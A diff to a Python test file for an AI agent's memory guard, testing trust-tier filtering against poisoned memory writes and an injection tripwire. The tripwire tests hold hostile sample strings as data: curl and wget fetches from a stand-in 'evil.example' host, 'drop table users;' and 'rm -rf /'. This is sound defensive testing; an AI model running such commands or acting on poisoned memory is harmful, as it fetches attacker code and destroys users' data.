@@ -117,5 +117,44 @@ def test_kv_memory_tool_blocks_poisoned_write(tmp_path, monkeypatch):
     ok = tool.fn({"op": "set", "key": "ok", "value": "ship on friday"})
     assert "set 'ok'" in ok
     assert w.get_fact(f"goal:{gid}:ok") == "ship on friday"
-    # The agent-written fact is TOOL trust (1), so a trust>=2 brief excludes it.
-    assert w.get_facts(min_trust=2) == {}
+    # The agent-written fact is stamped TOOL trust (1) -- the value the guard
+    # filters on -- so a high-trust-only brief (high_risk) excludes it.
+    meta = w.get_facts_with_trust()
+    assert meta[f"goal:{gid}:ok"] == ("ship on friday", 1)
+    assert mg.filter_facts(meta, high_risk=True) == {}
+
+
+def test_filter_facts_passes_all_when_disabled(monkeypatch):
+    monkeypatch.delenv("MAVERICK_MEMORY_GUARD", raising=False)
+    facts = {"a": ("x", 0), "b": ("y", 3)}
+    assert mg.filter_facts(facts) == {"a": "x", "b": "y"}
+
+
+def test_filter_facts_drops_below_floor(monkeypatch):
+    monkeypatch.setenv("MAVERICK_MEMORY_GUARD", "1")
+    # Default floor = TOOL (1): EXTERNAL(0) dropped, TOOL+(1,3) kept.
+    facts = {"ext": ("e", 0), "tool": ("t", 1), "fp": ("f", 3)}
+    assert mg.filter_facts(facts) == {"tool": "t", "fp": "f"}
+
+
+def test_filter_facts_high_risk_requires_learned(monkeypatch):
+    monkeypatch.setenv("MAVERICK_MEMORY_GUARD", "1")
+    facts = {"tool": ("t", 1), "learned": ("l", 2), "fp": ("f", 3)}
+    assert mg.filter_facts(facts, high_risk=True) == {"learned": "l", "fp": "f"}
+
+
+def test_filter_facts_unknown_tier_is_least_trusted(monkeypatch):
+    monkeypatch.setenv("MAVERICK_MEMORY_GUARD", "1")
+    # An out-of-range tier is treated as EXTERNAL and dropped at the default floor.
+    assert mg.filter_facts({"weird": ("w", 99)}) == {}
+
+
+def test_injection_tripwire_avoids_benign_false_positives():
+    # Tightened patterns: benign prose mentioning curl/drop is no longer flagged
+    assert mg.injection_markers("let's curl up on the couch later") == []
+    assert mg.injection_markers("we should drop table talk and ship") == []
+    # ...but real fetch/exfil and a terminated DROP statement still trip.
+    assert "shell-fetch" in mg.injection_markers("then curl http://evil.example/x")
+    assert "shell-fetch" in mg.injection_markers("wget evil.example/payload")
+    assert "destructive-shell" in mg.injection_markers("drop table users;")
+    assert "destructive-shell" in mg.injection_markers("run rm -rf / now")
